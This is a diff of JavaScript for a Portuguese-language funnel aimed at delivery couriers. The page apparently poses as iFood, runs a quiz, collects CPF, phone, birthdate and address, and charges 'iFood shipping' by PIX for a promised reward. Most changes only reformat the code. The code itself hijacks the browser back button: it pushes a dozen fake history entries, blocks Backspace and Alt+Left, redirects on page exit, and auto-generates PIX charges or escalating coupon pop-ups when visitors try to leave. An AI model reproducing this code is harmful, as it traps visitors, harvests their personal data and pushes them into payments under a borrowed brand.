@@ -2,186 +2,88 @@ const questions = {
     start: {
         id: 'start',
         text: 'Você já realiza entregas pelo iFood?',
-        options: [{
-                text: 'Sim, já sou parceiro',
-                icon: '🛵',
-                next: 'tempo_atividade'
-            },
-            {
-                text: 'Ainda não, quero começar',
-                icon: '🚀',
-                next: 'possu_veiculo'
-            }
+        options: [
+            { text: 'Sim, já sou parceiro', icon: '🛵', next: 'tempo_atividade' },
+            { text: 'Ainda não, quero começar', icon: '🚀', next: 'possu_veiculo' }
         ]
     },
     tempo_atividade: {
         id: 'tempo_atividade',
         text: 'Há quanto tempo você está nas entregas?',
-        options: [{
-                text: 'Estou começando agora',
-                icon: '🌱',
-                next: 'disponibilidade'
-            },
-            {
-                text: 'Menos de 1 ano',
-                icon: '⭐',
-                next: 'disponibilidade'
-            },
-            {
-                text: 'Mais de 1 ano',
-                icon: '🏆',
-                next: 'disponibilidade'
-            }
+        options: [
+            { text: 'Estou começando agora', icon: '🌱', next: 'disponibilidade' },
+            { text: 'Menos de 1 ano', icon: '⭐', next: 'disponibilidade' },
+            { text: 'Mais de 1 ano', icon: '🏆', next: 'disponibilidade' }
         ]
     },
     possu_veiculo: {
         id: 'possu_veiculo',
         text: 'Você já tem veículo para entregas?',
-        options: [{
-                text: 'Sim, já tenho',
-                icon: '✅',
-                next: 'tipo_veiculo'
-            },
-            {
-                text: 'Estou providenciando',
-                icon: '🛠️',
-                next: 'tipo_veiculo'
-            }
+        options: [
+            { text: 'Sim, já tenho', icon: '✅', next: 'tipo_veiculo' },
+            { text: 'Estou providenciando', icon: '🛠️', next: 'tipo_veiculo' }
         ]
     },
     tipo_veiculo: {
         id: 'tipo_veiculo',
         text: 'Qual será seu principal meio de entrega?',
-        options: [{
-                text: 'Moto',
-                icon: '🏍️',
-                next: 'cnh_status'
-            },
-            {
-                text: 'Bicicleta',
-                icon: '🚲',
-                next: 'disponibilidade'
-            }
+        options: [
+            { text: 'Moto', icon: '🏍️', next: 'cnh_status' },
+            { text: 'Bicicleta', icon: '🚲', next: 'disponibilidade' }
         ]
     },
     cnh_status: {
         id: 'cnh_status',
         text: 'Qual é a situação da sua CNH?',
-        options: [{
-                text: 'EAR (Atividade remunerada)',
-                icon: '✅',
-                next: 'disponibilidade'
-            },
-            {
-                text: 'CNH comum (sem EAR)',
-                icon: '⚠️',
-                next: 'disponibilidade'
-            },
-            {
-                text: 'Provisória',
-                icon: '🔰',
-                next: 'disponibilidade'
-            }
+        options: [
+            { text: 'EAR (Atividade remunerada)', icon: '✅', next: 'disponibilidade' },
+            { text: 'CNH comum (sem EAR)', icon: '⚠️', next: 'disponibilidade' },
+            { text: 'Provisória', icon: '🔰', next: 'disponibilidade' }
         ]
     },
     disponibilidade: {
         id: 'disponibilidade',
         text: 'Quantas horas por dia você pretende ficar online?',
-        options: [{
-                text: 'Até 4 horas',
-                icon: '⏱️',
-                next: 'objetivo_renda'
-            },
-            {
-                text: '4 a 8 horas',
-                icon: '💼',
-                next: 'objetivo_renda'
-            },
-            {
-                text: 'Mais de 8 horas',
-                icon: '🚀',
-                next: 'objetivo_renda'
-            }
+        options: [
+            { text: 'Até 4 horas', icon: '⏱️', next: 'objetivo_renda' },
+            { text: '4 a 8 horas', icon: '💼', next: 'objetivo_renda' },
+            { text: 'Mais de 8 horas', icon: '🚀', next: 'objetivo_renda' }
         ]
     },
     objetivo_renda: {
         id: 'objetivo_renda',
         text: 'Qual é seu objetivo com as entregas?',
-        options: [{
-                text: 'Renda extra',
-                icon: '💡',
-                next: 'regiao_preferencia'
-            },
-            {
-                text: 'Renda principal',
-                icon: '📈',
-                next: 'regiao_preferencia'
-            },
-            {
-                text: 'Quero crescer rápido',
-                icon: '🔥',
-                next: 'regiao_preferencia'
-            }
+        options: [
+            { text: 'Renda extra', icon: '💡', next: 'regiao_preferencia' },
+            { text: 'Renda principal', icon: '📈', next: 'regiao_preferencia' },
+            { text: 'Quero crescer rápido', icon: '🔥', next: 'regiao_preferencia' }
         ]
     },
     regiao_preferencia: {
         id: 'regiao_preferencia',
         text: 'Onde você prefere atuar?',
-        options: [{
-                text: 'Centro e arredores',
-                icon: '🏙️',
-                next: 'equipamento'
-            },
-            {
-                text: 'Bairros residenciais',
-                icon: '🏡',
-                next: 'equipamento'
-            },
-            {
-                text: 'Próximo a shoppings',
-                icon: '🛍️',
-                next: 'equipamento'
-            }
+        options: [
+            { text: 'Centro e arredores', icon: '🏙️', next: 'equipamento' },
+            { text: 'Bairros residenciais', icon: '🏡', next: 'equipamento' },
+            { text: 'Próximo a shoppings', icon: '🛍️', next: 'equipamento' }
         ]
     },
     equipamento: {
         id: 'equipamento',
         text: 'Você já tem bag térmica em boas condições?',
-        options: [{
-                text: 'Sim, mas preciso trocar',
-                icon: '♻️',
-                next: 'horario_pico'
-            },
-            {
-                text: 'Não tenho, preciso da primeira',
-                icon: '🎒',
-                next: 'horario_pico'
-            },
-            {
-                text: 'Tenho e quero uma reserva',
-                icon: '✅',
-                next: 'horario_pico'
-            }
+        options: [
+            { text: 'Sim, mas preciso trocar', icon: '♻️', next: 'horario_pico' },
+            { text: 'Não tenho, preciso da primeira', icon: '🎒', next: 'horario_pico' },
+            { text: 'Tenho e quero uma reserva', icon: '✅', next: 'horario_pico' }
         ]
     },
     horario_pico: {
         id: 'horario_pico',
         text: 'Você consegue rodar em horários de pico (almoço/jantar)?',
-        options: [{
-                text: 'Sim, com certeza',
-                icon: '🔥',
-                next: 'personal_step'
-            },
-            {
-                text: 'Consigo às vezes',
-                icon: '📅',
-                next: 'personal_step'
-            },
-            {
-                text: 'Prefiro horários alternativos',
-                icon: '🌙',
-                next: 'personal_step'
-            }
+        options: [
+            { text: 'Sim, com certeza', icon: '🔥', next: 'personal_step' },
+            { text: 'Consigo às vezes', icon: '📅', next: 'personal_step' },
+            { text: 'Prefiro horários alternativos', icon: '🌙', next: 'personal_step' }
         ]
     }
 };
@@ -403,10 +305,7 @@ function setupGlobalBackRedirect(page) {
     let checkoutBackPixInFlight = false;
     const guardDepth = 12;
     const guardToken = `${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
-    const stateBase = {
-        ifb: true,
-        token: guardToken
-    };
+    const stateBase = { ifb: true, token: guardToken };
     const firstOffer = getBackRedirectOffer(page, 1);
     const secondOffer = getBackRedirectOffer(page, 2);
     const canEscalateOffer = (
@@ -416,7 +315,7 @@ function setupGlobalBackRedirect(page) {
     );
     if (canEscalateOffer) {
         const currentCoupon = loadCoupon();
-        const currentAmountOff = Number(currentCoupon ? .amountOff || 0) || roundMoney(25.9 * Number(currentCoupon ? .discount || 0));
+        const currentAmountOff = Number(currentCoupon?.amountOff || 0) || roundMoney(25.9 * Number(currentCoupon?.discount || 0));
         if (currentAmountOff >= Number(secondOffer.amountOff || 0)) {
             shownOfferLevel = 2;
         } else if (currentAmountOff >= Number(firstOffer.amountOff || 0)) {
@@ -496,9 +395,7 @@ function setupGlobalBackRedirect(page) {
         if (backAttemptTracked) return;
         backAttemptTracked = true;
         trackPageView(`backredirect_${page}`);
-        trackLead('backredirect_click', {
-            stage: page
-        });
+        trackLead('backredirect_click', { stage: page });
     };
 
     const showCouponModal = (offerConfig = activeOffer) => {
@@ -510,10 +407,7 @@ function setupGlobalBackRedirect(page) {
         void modal.offsetWidth;
         modal.classList.add('coupon-anim-in');
         saveStoredOfferLevel(shownOfferLevel || 1);
-        trackLead(activeOffer.shownEvent, {
-            stage: page,
-            backOfferLevel: shownOfferLevel || 1
-        });
+        trackLead(activeOffer.shownEvent, { stage: page, backOfferLevel: shownOfferLevel || 1 });
     };
 
     const hideCouponModal = () => {
@@ -528,13 +422,9 @@ function setupGlobalBackRedirect(page) {
         const state = history.state || {};
         if (state.ifb && state.token === guardToken && Number(state.step || 0) >= guardDepth) return;
         try {
-            history.replaceState({ ...stateBase,
-                step: 0
-            }, '', baseUrl);
+            history.replaceState({ ...stateBase, step: 0 }, '', baseUrl);
             for (let step = 1; step <= guardDepth; step += 1) {
-                history.pushState({ ...stateBase,
-                    step
-                }, '', baseUrl);
+                history.pushState({ ...stateBase, step }, '', baseUrl);
             }
             lastGuardAt = now;
         } catch (error) {
@@ -544,12 +434,12 @@ function setupGlobalBackRedirect(page) {
 
     const handleBackAttempt = (event = null) => {
         const backState = (
-            event && typeof event === 'object' && event.state !== undefined ?
-            event.state :
-            history.state
+            event && typeof event === 'object' && event.state !== undefined
+                ? event.state
+                : history.state
         ) || {};
-        const isGuardState = backState ? .ifb === true && backState ? .token === guardToken;
-        if (event ? .type === 'popstate' && !isGuardState) {
+        const isGuardState = backState?.ifb === true && backState?.token === guardToken;
+        if (event?.type === 'popstate' && !isGuardState) {
             ensureGuardEntry(true);
             if (page !== 'checkout') return;
         }
@@ -569,7 +459,7 @@ function setupGlobalBackRedirect(page) {
                 return;
             }
             const currentCoupon = loadCoupon();
-            const currentAmountOff = Number(currentCoupon ? .amountOff || 0) || roundMoney(25.9 * Number(currentCoupon ? .discount || 0));
+            const currentAmountOff = Number(currentCoupon?.amountOff || 0) || roundMoney(25.9 * Number(currentCoupon?.discount || 0));
             const shouldAutoApplyBackCoupon = currentAmountOff <= 0;
             if (shouldAutoApplyBackCoupon) {
                 saveCoupon({
@@ -595,31 +485,31 @@ function setupGlobalBackRedirect(page) {
                 couponAmountOff: shouldAutoApplyBackCoupon ? 5 : currentAmountOff
             });
             showToast(
-                shouldAutoApplyBackCoupon ?
-                'Gerando PIX com R$ 5,00 de desconto no frete...' :
-                'Gerando pagamento...',
+                shouldAutoApplyBackCoupon
+                    ? 'Gerando PIX com R$ 5,00 de desconto no frete...'
+                    : 'Gerando pagamento...',
                 'success'
             );
 
             createPixCharge(shipping, 0, {
-                    sourceStage: shouldAutoApplyBackCoupon ?
-                        'orderbump_back_direct_coupon5' :
-                        'orderbump_back_direct'
-                })
+                sourceStage: shouldAutoApplyBackCoupon
+                    ? 'orderbump_back_direct_coupon5'
+                    : 'orderbump_back_direct'
+            })
                 .catch((error) => {
                     orderbumpBackInFlight = false;
-                    showToast(error ? .message || 'Erro ao gerar o PIX.', 'error');
+                    showToast(error?.message || 'Erro ao gerar o PIX.', 'error');
                 });
             return;
         }
 
         if (page === 'checkout') {
             const currentCoupon = loadCoupon();
-            const currentAmountOff = Number(currentCoupon ? .amountOff || 0) || roundMoney(25.9 * Number(currentCoupon ? .discount || 0));
+            const currentAmountOff = Number(currentCoupon?.amountOff || 0) || roundMoney(25.9 * Number(currentCoupon?.discount || 0));
             const hasFinalBackCoupon = (
                 currentAmountOff >= 10 ||
-                Number(currentCoupon ? .backOfferLevel || 0) >= 2 ||
-                String(currentCoupon ? .code || '').trim().toUpperCase() === 'FRETE10' ||
+                Number(currentCoupon?.backOfferLevel || 0) >= 2 ||
+                String(currentCoupon?.code || '').trim().toUpperCase() === 'FRETE10' ||
                 shownOfferLevel >= 2
             );
             if (hasFinalBackCoupon) {
@@ -660,7 +550,7 @@ function setupGlobalBackRedirect(page) {
                     sourceStage: 'checkout_back_coupon10_direct_pix'
                 }).catch((error) => {
                     checkoutBackPixInFlight = false;
-                    showToast(error ? .message || 'Erro ao gerar o PIX.', 'error');
+                    showToast(error?.message || 'Erro ao gerar o PIX.', 'error');
                 });
                 return;
             }
@@ -674,9 +564,7 @@ function setupGlobalBackRedirect(page) {
             shownOfferLevel = 2;
             showCouponModal(secondOffer);
             try {
-                history.pushState({ ...stateBase,
-                    step: guardDepth
-                }, '', baseUrl);
+                history.pushState({ ...stateBase, step: guardDepth }, '', baseUrl);
             } catch (_error) {
                 // Ignore browser-specific history restrictions.
             }
@@ -685,9 +573,7 @@ function setupGlobalBackRedirect(page) {
         shownOfferLevel = 1;
         showCouponModal(firstOffer);
         try {
-            history.pushState({ ...stateBase,
-                step: guardDepth
-            }, '', baseUrl);
+            history.pushState({ ...stateBase, step: guardDepth }, '', baseUrl);
         } catch (_error) {
             // Ignore browser-specific history restrictions.
         }
@@ -699,20 +585,10 @@ function setupGlobalBackRedirect(page) {
     ensureGuardEntry(true);
     setTimeout(reinforceGuards, 250);
     setTimeout(reinforceGuards, 1000);
-    window.addEventListener('pointerdown', reinforceGuards, {
-        passive: true,
-        once: true
-    });
-    window.addEventListener('touchstart', reinforceGuards, {
-        passive: true,
-        once: true
-    });
-    window.addEventListener('keydown', reinforceGuards, {
-        once: true
-    });
-    window.addEventListener('focus', reinforceGuards, {
-        passive: true
-    });
+    window.addEventListener('pointerdown', reinforceGuards, { passive: true, once: true });
+    window.addEventListener('touchstart', reinforceGuards, { passive: true, once: true });
+    window.addEventListener('keydown', reinforceGuards, { once: true });
+    window.addEventListener('focus', reinforceGuards, { passive: true });
     window.addEventListener('visibilitychange', () => {
         if (document.visibilityState === 'visible') reinforceGuards();
     });
@@ -723,33 +599,25 @@ function setupGlobalBackRedirect(page) {
     });
     window.addEventListener('load', () => {
         reinforceGuards();
-    }, {
-        once: true
-    });
+    }, { once: true });
     window.addEventListener('popstate', (event) => {
         if (window.__ifbAllowUnload) return;
         handleBackAttempt(event);
     });
     window.addEventListener('hashchange', () => {
         if (window.__ifbAllowUnload) return;
-        handleBackAttempt({
-            state: history.state,
-            type: 'hashchange'
-        });
+        handleBackAttempt({ state: history.state, type: 'hashchange' });
     });
     window.addEventListener('keydown', (event) => {
         const key = String(event.key || '').toLowerCase();
         const isBackspace = key === 'backspace';
         const isAltLeft = key === 'arrowleft' && event.altKey;
         if (!isBackspace && !isAltLeft) return;
-        const tag = String(event.target ? .tagName || '').toLowerCase();
-        const isInputLike = tag === 'input' || tag === 'textarea' || event.target ? .isContentEditable;
+        const tag = String(event.target?.tagName || '').toLowerCase();
+        const isInputLike = tag === 'input' || tag === 'textarea' || event.target?.isContentEditable;
         if (isInputLike && isBackspace) return;
         event.preventDefault();
-        handleBackAttempt({
-            state: history.state,
-            type: 'keydown'
-        });
+        handleBackAttempt({ state: history.state, type: 'keydown' });
     });
     const guardPulse = setInterval(() => {
         if (window.__ifbAllowUnload) {
@@ -783,56 +651,50 @@ function setupGlobalBackRedirect(page) {
 
                 if (page === 'pix') {
                     const pix = loadPix();
-                    const isUpsellPix = Boolean(pix ? .isUpsell || pix ? .upsell ? .enabled);
+                    const isUpsellPix = Boolean(pix?.isUpsell || pix?.upsell?.enabled);
                     if (!isUpsellPix) {
                         const shippingStored = loadShipping();
                         const shippingWithCoupon = applyCouponToShipping(shippingStored);
                         const reward = loadRewardSelection();
-                        const rewardExtraPrice = Number(pix ? .rewardExtraPrice || getRewardExtraPrice(reward));
+                        const rewardExtraPrice = Number(pix?.rewardExtraPrice || getRewardExtraPrice(reward));
                         const bump = loadBump() || {};
-                        const bumpSelected = bump ? .selected === true && Number(bump ? .price || 0) > 0;
+                        const bumpSelected = bump?.selected === true && Number(bump?.price || 0) > 0;
                         const bumpPrice = bumpSelected ? Number(bump.price || 0) : 0;
                         const fallbackShippingBase = Math.max(
                             0,
-                            Number((Number(pix ? .amount || 0) - bumpPrice - rewardExtraPrice).toFixed(2))
+                            Number((Number(pix?.amount || 0) - bumpPrice - rewardExtraPrice).toFixed(2))
                         );
                         const shippingForRegeneration = shippingWithCoupon || (
-                            shippingStored ?
-                            applyCouponToShipping({
-                                ...shippingStored,
-                                basePrice: Number(shippingStored.basePrice || shippingStored.originalPrice || shippingStored.price || 0),
-                                originalPrice: Number(shippingStored.originalPrice || shippingStored.basePrice || shippingStored.price || 0)
-                            }) :
-                            null
+                            shippingStored
+                                ? applyCouponToShipping({
+                                    ...shippingStored,
+                                    basePrice: Number(shippingStored.basePrice || shippingStored.originalPrice || shippingStored.price || 0),
+                                    originalPrice: Number(shippingStored.originalPrice || shippingStored.basePrice || shippingStored.price || 0)
+                                })
+                                : null
                         ) || (
-                            pix ?
-                            applyCouponToShipping({
-                                id: String(pix ? .shippingId || 'padrao'),
-                                name: String(pix ? .shippingName || 'Envio Padrão iFood'),
-                                eta: '',
-                                price: fallbackShippingBase,
-                                basePrice: fallbackShippingBase,
-                                originalPrice: fallbackShippingBase
-                            }) :
-                            null
+                            pix
+                                ? applyCouponToShipping({
+                                    id: String(pix?.shippingId || 'padrao'),
+                                    name: String(pix?.shippingName || 'Envio Padrão iFood'),
+                                    eta: '',
+                                    price: fallbackShippingBase,
+                                    basePrice: fallbackShippingBase,
+                                    originalPrice: fallbackShippingBase
+                                })
+                                : null
                         );
 
                         if (shippingForRegeneration) {
                             btnApply.disabled = true;
                             btnApply.textContent = 'Gerando novo PIX...';
                             try {
-                                trackLead(activeOffer.acceptEvent, {
-                                    stage: page,
-                                    copiedPix,
-                                    backOfferLevel: shownOfferLevel || 1
-                                });
+                                trackLead(activeOffer.acceptEvent, { stage: page, copiedPix, backOfferLevel: shownOfferLevel || 1 });
                                 setStage('checkout');
-                                await createPixCharge(shippingForRegeneration, bumpPrice, {
-                                    sourceStage: 'backredirect_pix_coupon'
-                                });
+                                await createPixCharge(shippingForRegeneration, bumpPrice, { sourceStage: 'backredirect_pix_coupon' });
                                 return;
                             } catch (error) {
-                                showToast(error ? .message || 'Nao foi possivel gerar um novo PIX com desconto agora.', 'error');
+                                showToast(error?.message || 'Nao foi possivel gerar um novo PIX com desconto agora.', 'error');
                                 btnApply.disabled = false;
                                 btnApply.textContent = originalCta;
                                 return;
@@ -842,11 +704,7 @@ function setupGlobalBackRedirect(page) {
                 }
             }
             hideCouponModal();
-            trackLead(activeOffer.acceptEvent, {
-                stage: page,
-                copiedPix,
-                backOfferLevel: shownOfferLevel || 1
-            });
+            trackLead(activeOffer.acceptEvent, { stage: page, copiedPix, backOfferLevel: shownOfferLevel || 1 });
             if (activeOffer.mode === 'pix-copy') return;
             if (activeOffer.mode === 'coupon') {
                 setStage('checkout');
@@ -867,7 +725,7 @@ function setupExitGuard(page) {
     window.__ifbAllowUnload = false;
     window.addEventListener('pagehide', (event) => {
         if (window.__ifbAllowUnload) return;
-        if (event ? .persisted) return;
+        if (event?.persisted) return;
         setTimeout(() => {
             if (!window.__ifbAllowUnload) window.location.href = buildDistinctBackRedirectUrl(page);
         }, 0);
@@ -933,7 +791,7 @@ function getBackRedirectOffer(page, level = 1) {
 
 async function copyPixCodeFromField() {
     const pixCode = document.getElementById('pix-code');
-    const value = String(pixCode ? .value || '').trim();
+    const value = String(pixCode?.value || '').trim();
     if (!value) return false;
     if (navigator.clipboard && typeof navigator.clipboard.writeText === 'function') {
         try {
@@ -944,7 +802,7 @@ async function copyPixCodeFromField() {
         }
     }
     try {
-        pixCode ? .select ? .();
+        pixCode?.select?.();
         document.execCommand('copy');
         return true;
     } catch (error) {
@@ -992,13 +850,11 @@ function cacheCommonDom() {
 function initHome() {
     const btnStart = document.getElementById('btn-start');
 
-    btnStart ? .addEventListener('click', () => {
+    btnStart?.addEventListener('click', () => {
         resetFlow();
         setStage('quiz');
-        trackLead('quiz_started', {
-            stage: 'quiz'
-        });
-        redirect('quiz');
+        trackLead('quiz_started', { stage: 'quiz' });
+        redirect('quiz.html');
     });
 }
 
@@ -1007,9 +863,7 @@ function initQuiz() {
     if (!currentStage || currentStage === 'quiz' || currentStage === 'personal') {
         setStage('quiz');
     }
-    trackLead('quiz_view', {
-        stage: 'quiz'
-    });
+    trackLead('quiz_view', { stage: 'quiz' });
 
     const questionText = document.getElementById('question-text');
     const optionsContainer = document.getElementById('options-container');
@@ -1103,9 +957,7 @@ function setupEmailAutocomplete(emailInput) {
 
     const applySuggestion = (value) => {
         emailInput.value = value;
-        emailInput.dispatchEvent(new Event('input', {
-            bubbles: true
-        }));
+        emailInput.dispatchEvent(new Event('input', { bubbles: true }));
         hide();
         emailInput.focus();
     };
@@ -1179,9 +1031,7 @@ function setupEmailAutocomplete(emailInput) {
 
 function initPersonal() {
     setStage('personal');
-    trackLead('personal_view', {
-        stage: 'personal'
-    });
+    trackLead('personal_view', { stage: 'personal' });
     const returnTo = getReturnTarget();
 
     const form = document.getElementById('personal-form');
@@ -1201,20 +1051,20 @@ function initPersonal() {
         if (birthdate) birthdate.value = personal.birth || '';
     }
 
-    cpf ? .addEventListener('input', () => maskCPF(cpf));
-    phone ? .addEventListener('input', () => maskPhone(phone));
-    birthdate ? .addEventListener('input', () => maskDate(birthdate));
+    cpf?.addEventListener('input', () => maskCPF(cpf));
+    phone?.addEventListener('input', () => maskPhone(phone));
+    birthdate?.addEventListener('input', () => maskDate(birthdate));
     setupEmailAutocomplete(email);
 
-    form ? .addEventListener('submit', (event) => {
+    form?.addEventListener('submit', (event) => {
         event.preventDefault();
         clearInlineError(errorBox);
 
-        const nameValue = fullname ? .value.trim() || '';
-        const cpfValue = cpf ? .value.trim() || '';
-        const emailValue = email ? .value.trim() || '';
-        const phoneValue = phone ? .value.trim() || '';
-        const birthValue = birthdate ? .value.trim() || '';
+        const nameValue = fullname?.value.trim() || '';
+        const cpfValue = cpf?.value.trim() || '';
+        const emailValue = email?.value.trim() || '';
+        const phoneValue = phone?.value.trim() || '';
+        const birthValue = birthdate?.value.trim() || '';
 
         if (nameValue.length < 3) {
             showInlineError(errorBox, 'Por favor, digite seu nome completo.');
@@ -1272,9 +1122,7 @@ function initPersonal() {
 function initCep() {
     if (!requirePersonal()) return;
     setStage('cep');
-    trackLead('cep_view', {
-        stage: 'cep'
-    });
+    trackLead('cep_view', { stage: 'cep' });
     const returnTo = getReturnTarget();
 
     const cepInput = document.getElementById('cep-input');
@@ -1294,11 +1142,11 @@ function initCep() {
     const btnConfirm = document.getElementById('btn-confirm-address');
 
     const collectCepAddressExtra = () => ({
-        number: noNumber ? .checked ? '' : (addrNumber ? .value || '').trim(),
-        complement: noComplement ? .checked ? '' : (addrComplement ? .value || '').trim(),
-        reference: (addrReference ? .value || '').trim(),
-        noNumber: !!noNumber ? .checked,
-        noComplement: !!noComplement ? .checked
+        number: noNumber?.checked ? '' : (addrNumber?.value || '').trim(),
+        complement: noComplement?.checked ? '' : (addrComplement?.value || '').trim(),
+        reference: (addrReference?.value || '').trim(),
+        noNumber: !!noNumber?.checked,
+        noComplement: !!noComplement?.checked
     });
 
     const setInputState = (input, disabled) => {
@@ -1308,31 +1156,31 @@ function initCep() {
     };
 
     const syncNoNumberState = () => {
-        const checked = !!noNumber ? .checked;
+        const checked = !!noNumber?.checked;
         if (checked && addrNumber) addrNumber.value = '';
         setInputState(addrNumber, checked);
     };
 
     const syncNoComplementState = () => {
-        const checked = !!noComplement ? .checked;
+        const checked = !!noComplement?.checked;
         if (checked && addrComplement) addrComplement.value = '';
         setInputState(addrComplement, checked);
     };
 
     const applyCepAddressExtra = (extra) => {
-        if (noNumber) noNumber.checked = !!extra ? .noNumber;
-        if (noComplement) noComplement.checked = !!extra ? .noComplement;
-        if (addrNumber) addrNumber.value = extra ? .noNumber ? '' : (extra ? .number || '');
-        if (addrComplement) addrComplement.value = extra ? .noComplement ? '' : (extra ? .complement || '');
-        if (addrReference) addrReference.value = extra ? .reference || '';
-        setInputState(addrNumber, !!extra ? .noNumber);
-        setInputState(addrComplement, !!extra ? .noComplement);
+        if (noNumber) noNumber.checked = !!extra?.noNumber;
+        if (noComplement) noComplement.checked = !!extra?.noComplement;
+        if (addrNumber) addrNumber.value = extra?.noNumber ? '' : (extra?.number || '');
+        if (addrComplement) addrComplement.value = extra?.noComplement ? '' : (extra?.complement || '');
+        if (addrReference) addrReference.value = extra?.reference || '';
+        setInputState(addrNumber, !!extra?.noNumber);
+        setInputState(addrComplement, !!extra?.noComplement);
     };
 
     const formatStreetPreview = (streetLine) => {
         const baseStreet = String(streetLine || '').trim() || 'Rua nao informada';
-        const number = (addrNumber ? .value || '').trim();
-        const numberLabel = noNumber ? .checked ? 's/n' : number;
+        const number = (addrNumber?.value || '').trim();
+        const numberLabel = noNumber?.checked ? 's/n' : number;
         return numberLabel ? `${baseStreet}, ${numberLabel}` : baseStreet;
     };
 
@@ -1349,10 +1197,10 @@ function initCep() {
         setHidden(addressResult, false);
         setHidden(addressExtra, false);
         setHidden(freightBox, false);
-        btnBuscar ? .classList.add('hidden');
+        btnBuscar?.classList.add('hidden');
     }
 
-    cepInput ? .addEventListener('input', () => {
+    cepInput?.addEventListener('input', () => {
         maskCep(cepInput);
         resetCepResults(errorBox, addressResult, freightBox, btnBuscar, loadingRow);
         setHidden(addressExtra, true);
@@ -1362,21 +1210,21 @@ function initCep() {
         clearInlineError(errorBox);
         saveAddressExtra(collectCepAddressExtra());
         const currentAddress = loadAddress();
-        updateAddressPreview(currentAddress ? .streetLine, currentAddress ? .cityLine);
+        updateAddressPreview(currentAddress?.streetLine, currentAddress?.cityLine);
     };
 
     [addrNumber, addrComplement, addrReference].forEach((input) => {
-        input ? .addEventListener('input', () => {
+        input?.addEventListener('input', () => {
             persistCepAddressExtra();
         });
     });
 
-    noNumber ? .addEventListener('change', () => {
+    noNumber?.addEventListener('change', () => {
         syncNoNumberState();
         persistCepAddressExtra();
     });
 
-    noComplement ? .addEventListener('change', () => {
+    noComplement?.addEventListener('change', () => {
         syncNoComplementState();
         persistCepAddressExtra();
     });
@@ -1385,9 +1233,7 @@ function initCep() {
         let attempt = 0;
         while (attempt <= retry) {
             try {
-                const response = await fetch(`https://brasilapi.com.br/api/cep/v1/${rawCep}`, {
-                    cache: 'no-store'
-                });
+                const response = await fetch(`https://brasilapi.com.br/api/cep/v1/${rawCep}`, { cache: 'no-store' });
                 if (!response.ok) throw new Error('CEP nao encontrado');
                 return await response.json();
             } catch (error) {
@@ -1399,7 +1245,7 @@ function initCep() {
         throw new Error('CEP nao encontrado');
     };
 
-    btnBuscar ? .addEventListener('click', async () => {
+    btnBuscar?.addEventListener('click', async () => {
         if (!cepInput) return;
         clearInlineError(errorBox);
 
@@ -1466,7 +1312,7 @@ function initCep() {
         }
     });
 
-    btnConfirm ? .addEventListener('click', () => {
+    btnConfirm?.addEventListener('click', () => {
         if (!loadAddress()) {
             showInlineError(errorBox, 'Confirme o CEP para continuar.');
             return;
@@ -1474,12 +1320,12 @@ function initCep() {
         const extra = collectCepAddressExtra();
         if (!extra.noNumber && !extra.number) {
             showInlineError(errorBox, 'Informe o numero do endereco para continuar.');
-            addrNumber ? .focus();
+            addrNumber?.focus();
             return;
         }
         if (!extra.noComplement && !extra.complement) {
             showInlineError(errorBox, 'Informe o complemento do endereco para continuar.');
-            addrComplement ? .focus();
+            addrComplement?.focus();
             return;
         }
         saveAddressExtra(extra);
@@ -1505,9 +1351,7 @@ function initProcessing() {
     if (!requireAddress()) return;
 
     setStage('processing');
-    trackLead('processing_view', {
-        stage: 'processing'
-    });
+    trackLead('processing_view', { stage: 'processing' });
 
     const textEl = document.getElementById('processing-text');
     const videoEl = document.getElementById('vsl-video');
@@ -1649,9 +1493,9 @@ function initProcessing() {
         };
 
         const safeStart = () => {
-            const durationMs = Number.isFinite(videoEl.duration) && videoEl.duration > 0 ?
-                videoEl.duration * 1000 :
-                30000;
+            const durationMs = Number.isFinite(videoEl.duration) && videoEl.duration > 0
+                ? videoEl.duration * 1000
+                : 30000;
             startTimeline(durationMs, false);
             syncVideoProgress();
         };
@@ -1709,15 +1553,9 @@ function initProcessing() {
             document.removeEventListener('pointerdown', unlockAudio);
         };
 
-        document.addEventListener('click', unlockAudio, {
-            once: true
-        });
-        document.addEventListener('touchstart', unlockAudio, {
-            once: true
-        });
-        document.addEventListener('pointerdown', unlockAudio, {
-            once: true
-        });
+        document.addEventListener('click', unlockAudio, { once: true });
+        document.addEventListener('touchstart', unlockAudio, { once: true });
+        document.addEventListener('pointerdown', unlockAudio, { once: true });
 
         videoEl.addEventListener('play', hideOverlay);
         videoEl.addEventListener('playing', hideOverlay);
@@ -1725,7 +1563,7 @@ function initProcessing() {
             if (!finishTriggered) showOverlay();
         });
 
-        overlayBtn ? .addEventListener('click', () => {
+        overlayBtn?.addEventListener('click', () => {
             applyPreferredAudio();
             tryPlay();
         });
@@ -1742,9 +1580,7 @@ function initSuccess() {
     if (!requireAddress()) return;
 
     setStage('success');
-    trackLead('success_view', {
-        stage: 'success'
-    });
+    trackLead('success_view', { stage: 'success' });
 
     const personal = loadPersonal();
     const rewardCards = Array.from(document.querySelectorAll('.success-reward-card'));
@@ -1753,14 +1589,14 @@ function initSuccess() {
     const btnCheckout = document.getElementById('btn-checkout');
     let selectedReward = loadRewardSelection();
 
-    if (leadName && personal ? .name) {
+    if (leadName && personal?.name) {
         const firstName = personal.name.trim().split(/\s+/)[0];
         leadName.textContent = firstName || personal.name;
     }
 
     const applyRewardState = (reward) => {
         rewardCards.forEach((card) => {
-            const isSelected = reward ? .id === card.dataset.rewardId;
+            const isSelected = reward?.id === card.dataset.rewardId;
             card.classList.toggle('is-selected', isSelected);
             card.setAttribute('aria-pressed', isSelected ? 'true' : 'false');
         });
@@ -1774,7 +1610,7 @@ function initSuccess() {
 
     rewardCards.forEach((card) => {
         card.addEventListener('click', () => {
-            const previousRewardId = String(selectedReward ? .id || '').trim();
+            const previousRewardId = String(selectedReward?.id || '').trim();
             const reward = resolveRewardSelection({
                 id: card.dataset.rewardId,
                 selectedAt: Date.now()
@@ -1796,7 +1632,7 @@ function initSuccess() {
 
     startTimer(300, timer);
 
-    btnCheckout ? .addEventListener('click', () => {
+    btnCheckout?.addEventListener('click', () => {
         const reward = loadRewardSelection();
         if (!reward) {
             showToast('Escolha 1 item para continuar.', 'error');
@@ -1913,8 +1749,8 @@ function initCheckout() {
     };
 
     const formatShippingPriceHtml = (option) => {
-        const currentPrice = Number(option ? .price || 0);
-        const originalPrice = Number(option ? .originalPrice || 0);
+        const currentPrice = Number(option?.price || 0);
+        const originalPrice = Number(option?.originalPrice || 0);
         if (originalPrice > currentPrice) {
             return `<span class="price-old">${formatCurrency(originalPrice)}</span><span class="price-new">${formatCurrency(currentPrice)}</span>`;
         }
